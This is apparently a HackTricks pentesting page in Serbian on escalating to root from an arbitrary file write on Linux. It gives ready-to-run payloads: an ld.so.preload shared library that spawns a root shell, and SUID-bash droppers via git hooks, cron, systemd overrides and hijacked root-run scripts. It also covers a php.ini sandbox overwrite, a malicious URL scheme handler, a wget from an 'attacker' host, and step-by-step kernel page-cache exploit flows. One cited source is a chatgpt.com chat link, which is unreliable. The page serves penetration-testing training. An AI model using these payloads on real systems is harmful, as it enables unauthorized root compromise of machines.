# Proizvoljan upis fajla u root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ovaj fajl se ponaša kao **`LD_PRELOAD`** env promenljiva, ali takođe radi u **SUID binaries**.\
Ako možete da ga kreirate ili izmenite, jednostavno možete dodati **putanju do biblioteke koja će biti učitana** pri svakom izvršavanju binary-ja.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **pokreću** pri različitim **događajima** u git repozitorijumu, kao što su kreiranje commit-a, merge... Dakle, ako **privilegovana skripta ili korisnik** često obavlja ove radnje i moguće je **pisati u `.git` folder**, ovo može da se iskoristi za **privesc**.

Na primer, moguće je **generisati skriptu** u git repozitorijumu, u **`.git/hooks`**, tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron i vremenske datoteke

Ako možete **pisati u datoteke povezane sa cronom koje root izvršava**, obično možete dobiti code execution kada se posao sledeći put pokrene. Zanimljive mete uključuju:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Sopstveni crontab korisnika root u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` tajmere i servise koje oni pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični načini zloupotrebe:

- **Dodavanje novog root cron job-a** u `/etc/crontab` ili datoteku u `/etc/cron.d/`
- **Zamena skripte** koju već izvršava `run-parts`
- **Backdoor postojećeg timer target-a** izmenom skripte ili binarnog fajla koji pokreće

Minimalni cron payload primer:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da upisujete samo u cron direktorijum koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato koristite nazive poput `backup` umesto `backup.sh`.
- Neke distribucije koriste `anacron` ili `systemd` tajmere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmeniti ono što će root kasnije izvršiti**.

### Service & Socket fajlovi

Ako možete da upisujete u **`systemd` unit fajlove** ili fajlove na koje oni upućuju, možda ćete moći da izvršite kod kao root ponovnim učitavanjem i pokretanjem unit-a ili čekanjem da se aktivira service/socket putanja.

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in override-i u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binari na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Upisivi `EnvironmentFile=` path-ovi koje učitava root service

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Uobičajeni načini zloupotrebe:

- **Overwrite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Add a drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite stari
- **Backdoor** skriptu/binary na koji unit već upućuje
- **Hijack a socket-activated service** izmenom odgovarajućeg `.service` fajla koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami da restartujete servise, ali možete da izmenite jedinicu aktiviranu putem socket-a, možda je dovoljno samo da **sačekate povezivanje klijenta** kako biste pokrenuli kompromitovani servis sa root privilegijama.

### Prepišite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki prilagođeni daemon-i proveravaju PHP koji dostavlja korisnik tako što pokreću `php` sa **restriktivnim `php.ini` fajlom** (na primer, `disable_functions=exec,system,...`). Ako kod u sandbox-u i dalje ima **bilo kakvu mogućnost upisivanja** (kao što je `file_put_contents`) i možete da pristupite **tačnoj putanji do `php.ini` fajla** koju koristi daemon, možete da **prepišete tu konfiguraciju** kako biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.

Tipičan tok:

1. Prvi payload prepisuje konfiguraciju sandbox-a.
2. Drugi payload izvršava kod nakon ponovnog omogućavanja opasnih funkcija.

Minimalni primer (zamenite putanju onom koju koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili validira putanje čiji je vlasnik root), drugo izvršavanje daje root kontekst. Ovo je u suštini **privilege escalation via config overwrite** kada sandboxed runtime i dalje može da upisuje fajlove.

### binfmt_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` navodi koji binarni fajl treba da izvršava koje tipove fajlova. TODO: proveriti zahteve za zloupotrebu ovoga radi izvršavanja rev shell-a kada se otvori uobičajeni tip fajla.

### Overwrite schema handlers (like http: or https:)

Napadač sa dozvolama za upis u konfiguracione direktorijume žrtve može lako da zameni ili kreira fajlove koji menjaju ponašanje sistema, što dovodi do nenamernog izvršavanja koda. Izmenom fajla `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handleri pokazuju na zlonamerni fajl (npr. postavljanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klik na bilo koji http ili https link pokrene kod naveden u tom `evil.desktop` fajlu**. Na primer, nakon postavljanja sledećeg zlonamernog koda u `evil.desktop` u direktorijumu `$HOME/.local/share/applications`, svaki klik na eksterni URL izvršava ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Za više informacija pogledajte [**ovu objavu**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), gde je iskorišćena stvarna ranjivost.

### Root izvršava skripte/binarne fajlove koje korisnik može da menja

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma čiji je vlasnik unprivileged user), možete ga hijack-ovati:

- **Detektujte izvršavanje:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili kada root poziva putanje pod kontrolom korisnika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdite mogućnost upisa:** proverite da li su i ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika i da li korisnik ima dozvolu za upis.
- **Preotmite cilj:** napravite rezervnu kopiju originalnog binarnog fajla/skripte i postavite payload koji kreira SUID shell (ili izvršava bilo koju drugu root radnju), zatim vratite dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu radnju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked putanju, preuzmite escalated shell pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih fajlova samo u page cache-u

Neke kernel greške ne menjaju fajl **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljivog fajla. Ako možete da ciljate **setuid** ili drugi binarni fajl koji izvršava **root**, sledeće izvršavanje može pokrenuti bytes kojima upravlja attacker iz memorije i dovesti do eskalacije privilegija, iako hash fajla na disku ostaje nepromenjen.

Ovo je korisno posmatrati kao **primitiv za upis u fajl samo tokom runtime-a**:

- **Disk ostaje čist**: inode i bytes na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju sadržaj koji je izmenio attacker
- **Efekat je privremen**: izmena nestaje nakon reboot-a ili izbacivanja iz cache-a

Ovaj primitiv se nalazi između klasičnog **arbitrary file write** i starijih bugova za zloupotrebu page cache-a, kao što su Dirty COW / Dirty Pipe:

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja pozicije upisa
- Primitiv koji radi samo u page cache-u može biti pouzdaniji ako ranjiva putanja omogućava direktne upise u keširane file-backed stranice

#### Generic privesc flow

1. Nabavite kernel primitiv koji može da upisuje u **file-backed page cache stranice**
2. Iskoristite ga protiv **čitljivog privilegovanog binarnog fajla** ili drugog fajla koji izvršava root
3. Pokrenite izvršavanje **pre** nego što stranica bude izbačena iz cache-a
4. Dobijte code execution kao root, dok fajl na disku i dalje izgleda neizmenjeno

Tipične mete visoke vrednosti:

- **setuid-root** binarni fajlovi
- Helper-i koje pokreću **root servisi**
- Binarni fajlovi koji se često izvršavaju iz **container-a koji dele host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):

- `splice()` može da prebaci reference na page-cache stranice iz čitljivog fajla u crypto TX scatterlist
- in-place `algif_aead` decrypt putanja ponovo je koristila source i destination buffere
- `authencesn` je zatim upisivao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed stranice, upis je završavao u **page cache-u ciljnog fajla**

Dakle, zanimljiva tehnika nije sam CVE, već obrazac:

- **proslediti file-backed cache stranice kernel subsystem-u**
- učiniti da ih subsystem **tretira kao writable output**
- pokrenuti mali kontrolisani overwrite u memoriji

Javni PoC je koristio ponovljene **4-byte upise** za izmenu `/usr/bin/su` u memoriji, a zatim ga je izvršavao.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **page-cache-only write-to-root**, ali je ovog puta sink **IPsec ESP decrypt**, umesto `AF_ALG`.

Važna tehnika je korak **metadata-laundering**:

- `splice()` postavlja **read-only file-backed page-cache stranicu** u ESP-in-UDP packet
- originalna DirtyFrag mitigation označavala je taj skb pomoću `SKBFL_SHARED_FRAG`, kako bi `esp_input()` izvršio **copy pre decrypt-a**
- netfilter `TEE` duplicira packet kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zadržava **istu fizičku page-cache referencu**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim tretira clone kao bezbedan i pokreće **in-place `cbc(aes)` decrypt** nad file-backed stranicom

Pouka za review je šira od samog CVE-a: ako mitigation zavisi od **skb/page metadata** da bi odlučila da li operacija prvo mora da izvrši copy, svaki **clone/copy path koji zadržava backing page, ali uklanja metadata** može neprimetno ponovo otvoriti ovaj write primitiv.

Tipičan exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` za dobijanje **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podignite loopback i instalirajte **netfilter `TEE` rule** u `mangle/OUTPUT`
3. instalirajte **XFRM ESP transport SAs** preko `NETLINK_XFRM`
4. kodirajte svaku ciljnu 4-byte reč u SA `seq_hi` field (DirtyFrag-ov word-selection trick)
5. pošaljite spliced ESP-in-UDP packet tako da **TEE clone** stigne do `esp_input()` i izvrši decrypt **in place**
6. ponavljajte dok page-cache kopija `/usr/bin/su` ili drugog privilegovanog executable-a ne bude sadržala code kojim upravlja attacker

Operativno, uticaj je isti kao u `AF_ALG` primeru: fajl na disku ostaje čist, ali `execve()` koristi **izmenjene bytes iz page cache-a** i obezbeđuje root.

Korisne provere izloženosti za ovu varijantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kratkoročno smanjenje površine napada je i ovde specifično za putanju: nadogradnja na kernel koji sadrži `48f6a5356a33` popravlja putanju za clone, dok blokiranje automatskog učitavanja `xt_TEE` uklanja **korak za prikrivanje zastavica**, a blokiranje `esp4` / `esp6` uklanja **odredište za dešifrovanje**.

#### Otkrivanje i hunting

Ako sumnjate na ovu klasu grešaka, nemojte se oslanjati samo na provere integriteta diska. Takođe proverite:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učitava/uklanja kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binaries su dobre mete jer patch koji utiče samo na page cache može biti dovoljan da se lokalni foothold pretvori u root

#### Smanjenje attack surface-a za `algif_aead` putanju

Ako se ranjivi interfejs obezbeđuje putem modula koji može da se učitava:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, neki izveštaji navode da je init putanja blokirana porukom:
```bash
initcall_blacklist=algif_aead_init
```
Ovu vrstu mitigacije vredi zapamtiti i za druge kernel LPE napade: ako exploit zavisi od određenog opcionog interfejsa, onemogućavanje tog interfejsa ili njegovo stavljanje na blacklist može prekinuti putanju exploita čak i pre nego što bude dostupna potpuna nadogradnja kernela.

## Reference

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
